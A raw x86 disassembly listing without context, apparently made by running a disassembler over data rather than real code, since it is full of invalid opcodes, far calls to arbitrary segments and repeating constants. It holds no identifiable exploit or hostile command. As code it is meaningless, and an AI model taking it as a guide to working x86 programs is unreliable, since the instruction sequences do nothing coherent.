  4331b9:	sbb    dl,BYTE PTR [ecx-0x116d79fc]
  4331bf:	sub    cl,BYTE PTR ds:0x610dda75
  4331c5:	or     eax,0x910ddacd
  4331ca:	push   esi
  4331cb:	cdq    
  4331cc:	xchg   esi,eax
  4331cd:	or     eax,0x6817fbcd
  4331d2:	or     eax,0x610dda75
  4331d7:	or     eax,0x910dfbcd
  4331dc:	push   esi
  4331dd:	(bad)  
  4331de:	std    
  4331df:	popa   
  4331e0:	popa   
  4331e1:	popa   
  4331e2:	pop    ss
  4331e3:	loop   0x4331c4
  4331e5:	bound  esp,QWORD PTR [edx+0x62]
  4331e8:	or     eax,0x610dda75
  4331ed:	or     eax,0x1f2d2ccd
  4331f2:	or     eax,0x681776cd
  4331f7:	or     eax,0x610dda75
  4331fc:	or     eax,0x910dfbcd
  433201:	push   esi
  433202:	cdq    
  433203:	cmp    BYTE PTR [edi],dl
  433205:	jne    0x433264
  433207:	or     eax,0xb857e75
  43320c:	call   0xa8e8:0x5e343ac9
  433213:	popa   
  433214:	pop    ss
  433215:	jne    0x43326c
  433217:	or     eax,0x6262dfe2
  43321c:	bound  ecx,QWORD PTR ds:0xe217f7a2
  433222:	out    0x62,eax
  433224:	bound  esp,QWORD PTR [edx-0x12]
  433227:	xchg   ebx,eax
  433228:	or     eax,0x6262dfe2
  43322d:	bound  ecx,QWORD PTR ds:0xe217f7a2
  433233:	out    0x62,eax
  433235:	bound  esp,QWORD PTR [edx+0xd]
  433238:	jne    0x4332b8
  43323a:	test   DWORD PTR [ebx],ecx
  43323c:	call   0xa8e8:0x5e343ac9
  433243:	popa   
  433244:	mov    eax,ds:0x6262e7e2
  433249:	bound  edx,QWORD PTR [ebx+0x6168726e]
  43324f:	popa   
  433250:	or     eax,0xb857e75
  433255:	call   0xa8e8:0x5e343ac9
  43325c:	popa   
  43325d:	pop    ss
  43325e:	loop   0x43324b
  433260:	bound  esp,QWORD PTR [edx+0x62]
  433263:	out    dx,al
  433264:	lea    ecx,ds:0x6262ebe2
  43326a:	bound  esp,QWORD PTR [edx+0x62ebe217]
  433270:	bound  esp,QWORD PTR [edx+0xd]
  433273:	loop   0x43325c
  433275:	bound  esp,QWORD PTR [edx+0x62]
  433278:	fdiv   st,st(3)
  43327a:	call   0x62eb:0xe2a1f34f
  433281:	bound  esp,QWORD PTR [edx-0x6d]
  433284:	fsub   DWORD PTR [edx]
  433286:	popa   
  433287:	popa   
  433288:	popa   
  433289:	or     eax,0x6262ebe2
  43328e:	bound  ecx,QWORD PTR ds:0x6262df13
  433294:	bound  edx,QWORD PTR [ebx-0x6566d30e]
  43329a:	or     eax,0x6fd68acd
  43329f:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4332a5:	pop    esi
  4332a6:	call   0x3f629453
  4332ab:	xchg   BYTE PTR ds:0x66d68aa5,cl
  4332b1:	or     ebx,DWORD PTR [edx+0x22d63ac9]
  4332b7:	pop    esi
  4332b8:	call   0x4e709465
  4332bd:	jg     0x4332de
  4332bf:	pop    ss
  4332c0:	loop   0x43333c
  4332c2:	bound  esp,QWORD PTR [edx+0x62]
  4332c5:	or     eax,0x6262ebe2
  4332ca:	bound  ecx,QWORD PTR ds:0x6262df13
  4332d0:	bound  edx,QWORD PTR [ebx-0x6566d30e]
  4332d6:	pop    ds
  4332d7:	imul   eax,DWORD PTR [esi+0x62e6e217],0xe20d6262
  4332e1:	out    0x62,al
  4332e3:	bound  esp,QWORD PTR [edx+0x33]
  4332e6:	pop    esi
  4332e7:	call   0xbc89494
  4332ec:	call   0x1e2:0x239d3ac9
  4332f3:	imul   esp,edi,0x6270f03a
  4332f9:	bound  esp,QWORD PTR [edx-0x12]
  4332fc:	ror    DWORD PTR ds:0x610dda75,1
  433302:	or     eax,0x6262df13
  433307:	bound  ecx,QWORD PTR ds:0x7a135691
  43330d:	bound  esp,QWORD PTR [edx+0x62]
  433310:	fcom   DWORD PTR [esi+0x72e7619a]
  433316:	or     eax,0x610dda75
  43331b:	or     eax,0x6262df13
  433320:	bound  ecx,QWORD PTR ds:0x7a135691
  433326:	bound  esp,QWORD PTR [edx+0x62]
  433329:	push   esi
  43332a:	pop    ds
  43332b:	pop    ss
  43332c:	loop   0x4332fc
  43332e:	bound  esp,QWORD PTR [edx+0x62]
  433331:	or     eax,0x610d7675
  433336:	or     eax,0x6262ce13
  43333b:	bound  edx,QWORD PTR [esi+0x68]
  43333e:	or     eax,0x6262ce13
  433343:	bound  edx,QWORD PTR [edi]
  433345:	push   0x626280f0
  43334a:	bound  ecx,QWORD PTR ds:0xe2565575
  433350:	out    0x62,eax
  433352:	bound  esp,QWORD PTR [edx+0x17]
  433355:	jne    0x4333ac
  433357:	or     eax,0xcd0d5575
  43335c:	sti    
  43335d:	or     eax,0x54d6a791
  433362:	popa   
  433363:	popa   
  433364:	popa   
  433365:	call   0xdcf21c9
  43336a:	loop   0x43334b
  43336c:	bound  esp,QWORD PTR [edx+0x62]
  43336f:	push   esi
  433370:	loop   0x433359
  433372:	bound  esp,QWORD PTR [edx+0x62]
  433375:	pop    ss
  433376:	loop   0x433357
  433378:	bound  esp,QWORD PTR [edx+0x62]
  43337b:	lock and al,0x63
  43337e:	bound  esp,QWORD PTR [edx+0xd]
  433381:	jne    0x43330d
  433383:	test   DWORD PTR [ebx],ecx
  433385:	call   0xd68a:0xcd0d3ac9
  43338c:	outs   dx,DWORD PTR ds:[esi]
  43338d:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  433393:	call   0xcd0d:0x61ce1b4b
  43339a:	mov    dl,dh
  43339c:	outs   dx,DWORD PTR ds:[esi]
  43339d:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  4333a3:	call   0xcd0d:0x61a8e85e
  4333aa:	mov    dl,dh
  4333ac:	outs   dx,DWORD PTR ds:[esi]
  4333ad:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  4333b3:	call   0x7517:0x61a8e85e
  4333ba:	fisttp DWORD PTR ds:0xcd0d2c75
  4333c0:	jle    0x433398
  4333c2:	outs   dx,DWORD PTR ds:[esi]
  4333c3:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  4333c9:	adc    ebp,ebx
  4333cb:	dec    ebp
  4333cc:	push   edi
  4333cd:	popa   
  4333ce:	or     eax,0x610dfb75
  4333d3:	or     eax,0x6fd68acd
  4333d8:	or     ebx,DWORD PTR [edx-0x5df2c537]
  4333de:	rcl    BYTE PTR [edi],cl
  4333e0:	outs   dx,BYTE PTR ds:[esi]
  4333e1:	adc    ebp,ebx
  4333e3:	dec    ebp
  4333e4:	push   edi
  4333e5:	popa   
  4333e6:	or     eax,0xb85a675
  4333eb:	call   0xa8e8:0x5e343ac9
  4333f2:	popa   
  4333f3:	or     eax,0x6fd68acd
  4333f8:	or     ebx,DWORD PTR [edx-0x5af2c537]
  4333fe:	mov    dl,dh
  433400:	or     bx,WORD PTR [edx+0x10133ac9]
  433407:	mov    DWORD PTR [ebx+0x1b],ecx
  43340a:	into   
  43340b:	popa   
  43340c:	pop    ss
  43340d:	sub    al,0x13
  43340f:	outs   dx,BYTE PTR ds:[esi]
  433410:	or     eax,0xb858a75
  433415:	call   0xd68a:0xcd0d3ac9
  43341c:	outs   dx,DWORD PTR ds:[esi]
  43341d:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  433423:	call   0xcd0d:0x61ce1b4b
  43342a:	mov    dl,dh
  43342c:	outs   dx,DWORD PTR ds:[esi]
  43342d:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  433433:	call   0xcd13:0x61a8e85e
  43343a:	imul   edx,DWORD PTR [edi],0x136ee2c6
  433440:	jne    0x43341d
  433442:	ror    BYTE PTR ds:0xb858a75,cl
  433448:	call   0xa8e8:0x5e343ac9
  43344f:	popa   
  433450:	ror    BYTE PTR ds:0xed349e75,cl
  433456:	popa   
  433457:	popa   
  433458:	popa   
  433459:	ror    BYTE PTR ds:0xdb0d9e75,cl
  43345f:	cmc    
  433460:	push   0x72626161
  433465:	bound  esp,QWORD PTR [ebp-0x618af28e]
  43346b:	or     eax,0x6168dbdb
  433470:	popa   
  433471:	pop    ss
  433472:	jne    0x4334c0
  433474:	or     eax,0x610d7675
  433479:	push   esi
  43347a:	jne    0x4334c8
  43347c:	pop    ss
  43347d:	jne    0x4334cb
  43347f:	or     eax,0xcd0d4c75
  433484:	jbe    0x433493
  433486:	xchg   ecx,eax
  433487:	pop    ss
  433488:	call   0x2c22:0x575d750d
  43348f:	popa   
  433490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433491:	or     eax,0x13c9c964
  433496:	jne    0x4334ed
  433498:	pop    ss
  433499:	jne    0x433504
  43349b:	or     eax,0x61216975
  4334a0:	push   edx
  4334a1:	sub    dl,dh
  4334a3:	imul   edx,esi,0x2a5255ea
  4334a9:	(bad)  
  4334aa:	imul   esi,DWORD PTR [edx-0x6d8af274],0xe090a2ff
  4334b4:	or     eax,0xa2ff8675
  4334b9:	call   0xa2ff:0x86750d60
  4334c0:	nop
  4334c1:	loopne 0x4334d0
  4334c3:	jne    0x433457
  4334c5:	jmp    DWORD PTR [edx+0x22571b5f]
  4334cb:	xchg   BYTE PTR [ecx-0x5b],ah
  4334ce:	or     eax,0x750dc964
  4334d3:	jbe    0x4334e2
  4334d5:	fisttp DWORD PTR [eax+ebp*2]
  4334d8:	popa   
  4334d9:	popa   
  4334da:	or     eax,0x55751761
  4334df:	or     eax,0xb859a75
  4334e4:	call   0xa8e8:0x5e343ac9
  4334eb:	popa   
  4334ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4334ed:	jne    0x433481
  4334ef:	mov    dl,0x7e
  4334f1:	clc    
  4334f2:	pushf  
  4334f3:	xchg   BYTE PTR [edx-0x11a872aa],dh
  4334f9:	mov    edi,0x869cf698
  4334fe:	mov    dl,0x56
  433500:	lock out dx,eax
  433502:	popa   
  433503:	popa   
  433504:	popa   
  433505:	or     eax,0x610d7e75
  43350a:	or     eax,0x6fd69acd
  43350f:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433515:	pop    esi
  433516:	call   0x1fea96c3
  43351b:	out    0x80,eax
  43351d:	bound  esi,QWORD PTR [edx-0x754d9d8a]
  433523:	bound  esi,QWORD PTR [edx+0x7e750d55]
  433529:	bound  esi,QWORD PTR [edx-0xd]
  43352c:	test   eax,0xd626265
  433531:	int    0x7e
  433533:	pop    ss
  433534:	push   0x750dceee
  433539:	call   0x343a:0xc99a0b85
  433540:	pop    esi
  433541:	call   0xcd5096ee
  433546:	xchg   dh,dl
  433548:	outs   dx,DWORD PTR ds:[esi]
  433549:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43354f:	pop    esi
  433550:	call   0x1fea96fd
  433555:	mov    dl,0x88
  433557:	clc    
  433558:	inc    edi
  433559:	xor    ecx,esi
  43355b:	fsubr  st(5),st
  43355d:	sbb    al,0xed
  43355f:	push   ebp
  433560:	imul   ecx,DWORD PTR [ecx],0xfffffff6
  433563:	inc    edi
  433564:	xor    ecx,esi
  433566:	fsub   st(6),st
  433568:	test   al,0xd
  43356a:	jne    0x433506
  43356c:	test   DWORD PTR [ebx],ecx
  43356e:	call   0xa8e8:0x5e343ac9
  433575:	popa   
  433576:	mov    eax,ds:0x89e75575
  43357b:	clc    
  43357c:	mov    eax,ds:0x3393b57c
  433581:	and    ecx,esi
  433583:	(bad)  
  433584:	jmp    0x43357c
  433586:	mov    eax,ds:0xee93b57c
  43358b:	xchg   ebx,eax
  43358c:	clc    
  43358d:	inc    edi
  43358e:	addr16 lahf 
  433590:	scas   eax,DWORD PTR es:[edi]
  433591:	aad    0x9c
  433593:	fs xchg ebp,eax
  433595:	enter  0x47f6,0x67
  433599:	lahf   
  43359a:	scas   eax,DWORD PTR es:[edi]
  43359b:	push   edi
  43359c:	and    cl,BYTE PTR [edx+0x640da561]
  4335a2:	fsub   DWORD PTR [esi+eax*4+0xd]
  4335a6:	jne    0x433542
  4335a8:	test   DWORD PTR [ebx],ecx
  4335aa:	call   0xa8e8:0x5e343ac9
  4335b1:	popa   
  4335b2:	or     eax,0x681792cd
  4335b7:	or     eax,0xdb0d8a75
  4335bc:	jmp    0xda49729
  4335c1:	int    0x8a
  4335c3:	or     eax,0x6168e917
  4335c8:	popa   
  4335c9:	or     eax,0x56610d91
  4335ce:	cdq    
  4335cf:	xchg   esi,eax
  4335d0:	pop    ss
  4335d1:	jne    0x433630
  4335d3:	or     eax,0xdb0d8a75
  4335d8:	dec    eax
  4335d9:	push   0xa20d6161
  4335de:	jle    0x4335f7
  4335e0:	jne    0x43364b
  4335e2:	jo     0x4335db
  4335e4:	jp     0x433647
  4335e6:	jb     0x433649
  4335e8:	popa   
  4335e9:	or     eax,0xeb625d75
  4335ee:	shl    BYTE PTR [eax+0x61],cl
  4335f1:	bound  esp,QWORD PTR [ebp+0x7ecd0d69]
  4335f7:	pop    ss
  4335f8:	push   0x859a750d
  4335fd:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  433603:	call   0x755a97b0
  433608:	push   ebp
  433609:	bound  esi,QWORD PTR [edx+0x5575138a]
  43360f:	shl    BYTE PTR [edx-0x4e],cl
  433612:	jle    0x433676
  433614:	mov    dl,0x92
  433616:	bound  esi,QWORD PTR [edx-0x654d9d7a]
  43361c:	repz mov cl,0x63
  43361f:	bound  esp,QWORD PTR [edx+0xd]
  433622:	jne    0x4336a2
  433624:	or     eax,0x9acd0d61
  433629:	(bad)  
  43362a:	outs   dx,DWORD PTR ds:[esi]
  43362b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433631:	pop    esi
  433632:	call   0x1fea97df
  433637:	out    0x6a,eax
  433639:	or     eax,0xb858675
  43363e:	call   0xa8e8:0x5e343ac9
  433645:	popa   
  433646:	xchg   ebx,eax
  433647:	mov    edx,0xcd0d5575
  43364c:	xchg   edx,eax
  43364d:	pop    ss
  43364e:	push   0x617e2257
  433653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433654:	or     eax,0x9264d864
  433659:	and    DWORD PTR [ebp+0x5d],esi
  43365c:	lods   eax,DWORD PTR ds:[esi]
  43365d:	loop   0x433660
  43365f:	imul   esp,DWORD PTR [ecx],0xe2253175
  433665:	add    DWORD PTR [ecx+0xd],ebp
  433668:	jne    0x4336c7
  43366a:	test   DWORD PTR [ebx],ecx
  43366c:	call   0xa8e8:0x5e343ac9
  433673:	popa   
  433674:	pop    ss
  433675:	jne    0x4336cc
  433677:	or     eax,0x75178675
  43367c:	imul   edi,DWORD PTR [edx-0x53],0x626901e2
  433683:	mov    dl,0x69
  433685:	bound  esi,QWORD PTR [edx+0x5575139a]
  43368b:	shl    BYTE PTR [edx-0x4e],cl
  43368e:	imul   esp,DWORD PTR [edx-0x4e],0x5db26231
  433695:	repz fbld TBYTE PTR [ecx+0x61]
  433699:	popa   
  43369a:	pop    ss
  43369b:	jne    0x4336f2
  43369d:	or     eax,0x22575575
  4336a2:	xchg   BYTE PTR [ecx-0x5b],ah
  4336a5:	or     eax,0x92b26264
  4336aa:	bound  esi,QWORD PTR [edx-0x685e857a]
  4336b0:	mov    ah,0x69
  4336b2:	repz out 0x6f,eax
  4336b5:	bound  esp,QWORD PTR [edx+0xd]
  4336b8:	jne    0x433640
  4336ba:	jmp    DWORD PTR [ecx+0x50]
  4336bd:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  4336c3:	jp     0x43370e
  4336c5:	pop    edx
  4336c6:	loop   0x433731
  4336c8:	repz pop edx
  4336ca:	dec    edx
  4336cb:	bound  esp,QWORD PTR [edx+0xd]
  4336ce:	jne    0x433656
  4336d0:	jmp    DWORD PTR [edx-0x4d9d9bcc]
  4336d6:	xchg   edx,eax
  4336d7:	bound  esi,QWORD PTR [edx-0x11aa857a]
  4336dd:	loop   0x433748
  4336df:	repz pop es
  4336e1:	push   0x750d6161
  4336e6:	xchg   bh,bh
  4336e8:	mov    ds:0xb262f33b,al
  4336ed:	xchg   edx,eax
  4336ee:	bound  esi,QWORD PTR [edx-0x59b8857a]
  4336f4:	mov    ah,0x69
  4336f6:	repz retf 
  4336f8:	and    DWORD PTR [edx+0x62],esp
  4336fb:	or     eax,0xa2ff8675
  433700:	pop    edi
  433701:	sbb    esp,DWORD PTR [edx-0x4e]
  433704:	xchg   edx,eax
  433705:	bound  esi,QWORD PTR [edx-0x119f857a]
  43370b:	sar    BYTE PTR [edx],cl
  43370d:	repz fstp QWORD PTR [edx+eiz*2+0x62]
  433712:	mov    ebp,0xa5618622
  433717:	or     eax,0xfbead664
  43371c:	lods   eax,DWORD PTR ds:[esi]
  43371d:	loop   0x433720
  43371f:	imul   esi,DWORD PTR [edx-0x1dda852c],0xb2626901
  433729:	jbe    0x43378d
  43372b:	mov    dl,0x8a
  43372d:	bound  esi,QWORD PTR [edx-0x6d4d9d82]
  433733:	bound  esi,QWORD PTR [edx-0x654d9d7a]
  433739:	repz push eax
  43373b:	bound  esp,QWORD PTR [edx+0x62]
  43373e:	or     eax,0x68177ecd
  433743:	lock test eax,0xd6616168
  433749:	jmp    0xb269:0x1e225fb
  433750:	aam    0x7a
  433752:	mov    bl,0xe2
  433754:	add    DWORD PTR [ecx+0x62],ebp
  433757:	mov    dl,0x76
  433759:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  43375f:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  433765:	bound  esi,QWORD PTR [edx+0x62b0f39a]
  43376b:	bound  esp,QWORD PTR [edx+0xd]
  43376e:	int    0x7e
  433770:	pop    ss
  433771:	push   0x61685ff0
  433776:	popa   
  433777:	(bad)  
  433778:	jmp    0xb269:0x1e2b3fb
  43377f:	aam    0x7a
  433781:	and    esp,edx
  433783:	add    DWORD PTR [ecx+0x62],ebp
  433786:	mov    dl,0x76
  433788:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  43378e:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  433794:	bound  esi,QWORD PTR [edx+0x62e1f39a]
  43379a:	bound  esp,QWORD PTR [edx+0xd]
  43379d:	int    0x7e
  43379f:	pop    ss
  4337a0:	push   0x616145f0
  4337a5:	popa   
  4337a6:	(bad)  
  4337a7:	jmp    0xb269:0x1e223fb
  4337ae:	aam    0x7a
  4337b0:	and    dl,ah
  4337b2:	add    DWORD PTR [ecx+0x62],ebp
  4337b5:	mov    dl,0x76
  4337b7:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  4337bd:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  4337c3:	bound  esi,QWORD PTR [edx+0x62d7f39a]
  4337c9:	bound  esp,QWORD PTR [edx+0xd]
  4337cc:	int    0x7e
  4337ce:	pop    ss
  4337cf:	push   0x616154f0
  4337d4:	popa   
  4337d5:	(bad)  
  4337d6:	jmp    0xb269:0x1e227fb
  4337dd:	and    DWORD PTR [edx-0x4e],0x7eb26292
  4337e4:	bound  esi,QWORD PTR [edx-0x794d9d76]
  4337ea:	bound  esi,QWORD PTR [edx+0x5cacf39a]
  4337f0:	bound  esp,QWORD PTR [edx-0x10]
  4337f3:	fldenv [ecx+0x61]
  4337f6:	popa   
  4337f7:	(bad)  
  4337f8:	jmp    0xb269:0x1e220fb
  4337ff:	jg     0x43387b
  433801:	sub    edx,esp
  433803:	add    DWORD PTR [ecx+0x62],ebp
  433806:	mov    dl,0x76
  433808:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  43380e:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  433814:	bound  esi,QWORD PTR [edx+0x6367f39a]
  43381a:	bound  esp,QWORD PTR [edx+0xd]
  43381d:	int    0x7e
  43381f:	pop    ss
  433820:	push   0xead6a4ee
  433825:	sti    
  433826:	sub    edx,esp
  433828:	add    DWORD PTR [ecx-0x4e],ebp
  43382b:	jg     0x4338a7
  43382d:	push   ds
  43382e:	loop   0x433831
  433830:	imul   esp,DWORD PTR [edx-0x4e],0x8ab26276
  433837:	bound  esi,QWORD PTR [edx-0x6d4d9d82]
  43383d:	bound  esi,QWORD PTR [edx-0x654d9d7a]
  433843:	repz push edx
  433845:	arpl   WORD PTR [edx+0x62],sp
  433848:	or     eax,0x68177ecd
  43384d:	out    dx,al
  43384e:	cs (bad) 
  433850:	jmp    0xb269:0x1e21efb
  433857:	jns    0x4338d3
  433859:	daa    
  43385a:	loop   0x43385d
  43385c:	imul   esp,DWORD PTR [edx-0x4e],0x8ab26276
  433863:	bound  esi,QWORD PTR [edx-0x6d4d9d82]
  433869:	bound  esi,QWORD PTR [edx-0x654d9d7a]
  43386f:	repz add esp,DWORD PTR [ebx+0x62]
  433873:	bound  ecx,QWORD PTR ds:0x68177ecd
  433879:	or     eax,0x610d7e75
  43387e:	mov    ebp,0xa5617622
  433883:	or     eax,0x13c9c964
  433888:	jne    0x4338df
  43388a:	pop    ss
  43388b:	jne    0x4338f6
  43388d:	or     eax,0x61216975
  433892:	push   edx
  433893:	ds dec eax
  433895:	cmp    dl,dh
  433897:	jmp    0xb23a:0x483e5255
  43389e:	cmp    cl,BYTE PTR ds:0xa2ff9275
  4338a4:	cmp    bh,ch
  4338a6:	or     eax,0xa2ff9275
  4338ab:	push   0x86750d36
  4338b0:	jmp    DWORD PTR [edx+0x22575991]
  4338b6:	xchg   BYTE PTR [ecx-0x5b],ah
  4338b9:	or     eax,0x21c9c964
  4338be:	jne    0x433929
  4338c0:	lods   eax,DWORD PTR ds:[esi]
  4338c1:	pop    ebx
  4338c2:	add    DWORD PTR [ecx+0xd],ebp
  4338c5:	jne    0x43384d
  4338c7:	or     eax,0x6168e9db
  4338cc:	popa   
  4338cd:	or     eax,0x910d9acd
  4338d2:	pop    ss
  4338d3:	call   0xe9db:0xd86750d
  4338da:	push   0xcd0d6161
  4338df:	xchg   BYTE PTR ds:0x61680c17,cl
  4338e5:	popa   
  4338e6:	or     eax,0xd681761
  4338eb:	jne    0x433873
  4338ed:	or     eax,0x6168e9db
  4338f2:	popa   
  4338f3:	or     eax,0x170d86cd
  4338f8:	jmp    0xda49a65
  4338fd:	xchg   ecx,eax
  4338fe:	or     eax,0x96995661
  433903:	pop    ss
  433904:	jne    0x43395b
  433906:	or     eax,0xf2935575
  43390b:	mov    ds:0x69cd0d6a,al
  433910:	(bad)  
  433911:	outs   dx,DWORD PTR ds:[esi]
  433912:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433918:	pop    esi
  433919:	call   0x1fc29ac6
  43391e:	out    0x93,eax
  433920:	or     eax,0xdb0d8675
  433925:	pusha  
  433926:	push   0x61216161
  43392b:	and    eax,0x576901e2
  433930:	and    bl,BYTE PTR [edx+0x640da561]
  433936:	fsub   DWORD PTR [esi+edx*4+0x21]
  43393a:	jne    0x4339a5
  43393c:	lods   eax,DWORD PTR ds:[esi]
  43393d:	or     eax,DWORD PTR [ecx]
  43393f:	imul   esp,DWORD PTR [ecx],0xe2315575
  433945:	add    DWORD PTR [ecx+0x21],ebp
  433948:	jne    0x433992
  43394a:	and    dl,ah
  43394c:	add    DWORD PTR [ecx+0x21],ebp
  43394f:	jne    0x433982
  433951:	mov    bl,0xe2
  433953:	add    DWORD PTR [ecx+0x21],ebp
  433956:	jne    0x4339b5
  433958:	lods   eax,DWORD PTR ds:[esi]
  433959:	xor    al,0x9
  43395b:	imul   edx,DWORD PTR [ebx],0x7517f775
  433961:	cmp    al,0xd
  433963:	jne    0x4338f3
  433965:	or     eax,0x6168e9db
  43396a:	popa   
  43396b:	pop    ss
  43396c:	jne    0x433986
  43396e:	or     eax,0xdb0d8e75
  433973:	or     al,0x68
  433975:	popa   
  433976:	popa   
  433977:	pop    ss
  433978:	jne    0x4339ca
  43397a:	or     eax,0xdb0d8e75
  43397f:	adc    BYTE PTR [eax+0x61],ch
  433982:	popa   
  433983:	pop    ss
  433984:	jne    0x433979
  433986:	or     eax,0x610df375
  43398b:	or     eax,0x6fd686cd
  433990:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433996:	pop    esi
  433997:	call   0x1fea9b44
  43399c:	mov    dl,0x97
  43399e:	bound  esi,QWORD PTR [edx-0x44d9d72]
  4339a4:	repz xchg ebx,eax
  4339a6:	bound  esp,QWORD PTR [edx+0x62]
  4339a9:	or     eax,0x610d5075
  4339ae:	or     eax,0x910d50cd
  4339b3:	push   esi
  4339b4:	cdq    
  4339b5:	xchg   esi,eax
  4339b6:	pop    ss
  4339b7:	jne    0x433a1d
  4339b9:	or     eax,0xb858675
  4339be:	call   0xa8e8:0x5e343ac9
  4339c5:	popa   
  4339c6:	or     eax,0x68a7f3cd
  4339cb:	xchg   ebx,eax
  4339cc:	loop   0x433a1d
  4339ce:	popa   
  4339cf:	popa   
  4339d0:	popa   
  4339d1:	or     eax,0x610d1875
  4339d6:	pop    ss
  4339d7:	jne    0x433a31
  4339d9:	adc    esi,DWORD PTR [ebp+0x28]
  4339dc:	shl    BYTE PTR [edx-0x4e],cl
  4339df:	pop    eax
  4339e0:	bound  esi,QWORD PTR [edx+0x50b262f3]
  4339e6:	bound  esi,QWORD PTR [edx-0x714d9de8]
  4339ec:	bound  esi,QWORD PTR [edx+0x55b26292]
  4339f2:	bound  esi,QWORD PTR [edx+0x69b26231]
  4339f8:	adc    esi,DWORD PTR [ebp+0x64]
  4339fb:	rcl    BYTE PTR [ebx],cl
  4339fd:	jne    0x433a4b
  4339ff:	shl    BYTE PTR [edx-0x4e],cl
  433a02:	call   0x76b2:0x6286b262
  433a09:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  433a0f:	repz (bad) 
  433a11:	pop    ebp
  433a12:	bound  esp,QWORD PTR [edx+0x17]
  433a15:	jne    0x433a77
  433a17:	bound  esi,QWORD PTR [edx-0x754d9d8a]
  433a1d:	bound  esi,QWORD PTR [edx+0x60750d28]
  433a23:	bound  ebx,QWORD PTR [eax+0x13]
  433a26:	jne    0x433a1f
  433a28:	pop    ss
  433a29:	jne    0x433a67
  433a2b:	or     eax,0x75568e75
  433a30:	dec    esp
  433a31:	pop    ss
  433a32:	jne    0x4339c2
  433a34:	or     eax,0xdb0d8e75
  433a39:	jmp    0x17a49ba6
  433a3e:	jne    0x433a58
  433a40:	or     eax,0xdb0d8e75
  433a45:	or     al,0x68
  433a47:	popa   
  433a48:	popa   
  433a49:	pop    ss
  433a4a:	jne    0x433a9c
  433a4c:	or     eax,0xdb0d8e75
  433a51:	adc    BYTE PTR [eax+0x61],ch
  433a54:	popa   
  433a55:	pop    ss
  433a56:	jne    0x433a4b
  433a58:	or     eax,0x610df375
  433a5d:	or     eax,0x68a13ccd
  433a62:	call   0xf3b84808
  433a67:	or     eax,0x50cd0d61
  433a6c:	or     eax,0x50a50d91
  433a71:	or     eax,0x96c80d88
  433a76:	push   esi
  433a77:	sub    al,0x89
  433a79:	ror    BYTE PTR ds:0x68a13ccd,cl
  433a7f:	jae    0x433af7
  433a81:	or     eax,0x75173c75
  433a86:	stc    
  433a87:	or     eax,0x610d5075
  433a8c:	or     eax,0x910df3cd
  433a91:	sub    eax,0xf9cd0d1f
  433a96:	push   esi
  433a97:	push   0x17f9cd0d
  433a9c:	push   0xee4c750d
  433aa1:	lea    ecx,ds:0xb858675
  433aa7:	call   0xa8e8:0x5e343ac9
  433aae:	popa   
  433aaf:	push   edi
  433ab0:	and    bh,bl
  433ab2:	popa   
  433ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433ab4:	or     eax,0xa264d864
  433ab9:	or     eax,0x75179275
  433abe:	dec    eax
  433abf:	or     eax,0xdb0d4875
  433ac4:	or     al,0x68
  433ac6:	popa   
  433ac7:	popa   
  433ac8:	fsubr  DWORD PTR [edx-0x2779189f]
  433ace:	jmp    0xead8:0x3be7619a
  433ad5:	xchg   BYTE PTR [ecx-0x4e],ah
  433ad8:	cmp    ch,BYTE PTR [edi+0x68f4f01c]
  433ade:	popa   
  433adf:	popa   
  433ae0:	or     eax,0xdb0d4875
  433ae5:	or     al,0x68
  433ae7:	popa   
  433ae8:	popa   
  433ae9:	or     eax,0x170d48cd
  433aee:	or     al,0x68
  433af0:	popa   
  433af1:	popa   
  433af2:	or     eax,0x56610d91
  433af7:	cdq    
  433af8:	xchg   esi,eax
  433af9:	pop    ss
  433afa:	jne    0x433b14
  433afc:	or     eax,0x14d88675
  433b01:	add    al,0x61
  433b03:	popa   
  433b04:	popa   
  433b05:	popa   
  433b06:	out    0x8b,eax
  433b08:	or     eax,0x14d88675
  433b0d:	adc    BYTE PTR [ecx+0x61],ah
  433b10:	popa   
  433b11:	xchg   edx,eax
  433b12:	out    0x97,eax
  433b14:	or     eax,0xa20d8675
  433b19:	sahf   
  433b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433b1b:	jne    0x433ab7
  433b1d:	mov    dl,0x9a
  433b1f:	scas   eax,DWORD PTR es:[edi]
  433b20:	sbb    al,0xa2
  433b22:	lock (bad) [eax+0x61]
  433b26:	popa   
  433b27:	fcom   DWORD PTR [ebp-0x6a279e0d]
  433b2d:	dec    esp
  433b2e:	popa   
  433b2f:	fcom   DWORD PTR [ebp-0x6a279e9c]
  433b35:	push   eax
  433b36:	popa   
  433b37:	fcom   DWORD PTR [ebp-0x6a279ed8]
  433b3d:	pop    eax
  433b3e:	popa   
  433b3f:	fcom   DWORD PTR [ebp-0x6a279ec4]
  433b45:	pop    ebp
  433b46:	popa   
  433b47:	fcom   DWORD PTR [ebp+0x750d6131]
  433b4d:	dec    eax
  433b4e:	or     eax,0x616810db
  433b53:	popa   
  433b54:	or     eax,0x9a2d9acd
  433b59:	pop    ss
  433b5a:	int    0x55
  433b5c:	or     eax,0x4348675
  433b61:	popa   
  433b62:	popa   
  433b63:	popa   
  433b64:	pop    ss
  433b65:	jne    0x433b5a
